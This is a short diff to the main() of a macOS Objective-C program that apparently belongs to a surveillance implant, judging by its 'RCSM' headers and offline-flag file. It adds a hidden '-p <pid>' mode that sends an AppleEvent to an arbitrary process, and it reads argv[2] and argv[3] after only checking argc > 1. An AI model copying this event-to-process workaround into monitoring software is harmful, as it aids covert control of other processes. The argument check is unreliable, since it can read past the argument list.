@@ -17,11 +17,33 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+extern void lionSendEventToPid(pid_t pid);
 
 int main (int argc, const char *argv[])
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
+  // Fix for lion: AppleEvents only from unhidden proc
+  if (argc > 1) 
+    {
+      if (argv[2] && 
+          (strncmp(argv[2], "-p", strlen("-p")) == 0)) 
+        {
+          pid_t pid = atoi(argv[3]);
+
+#ifdef DEBUG_CORE
+          for (int i =0; i < argc; i++) 
+            infoLog(@"param[%d]=%s", i, argv[i]);
+#endif
+
+          lionSendEventToPid(pid);
+
+          [pool release];
+
+          exit(0);
+        }
+    }
+  
   NSString *offlineFlagPath = [[NSString alloc] initWithFormat: @"%@/off.flg",
                                [[NSBundle mainBundle] bundlePath]];
 
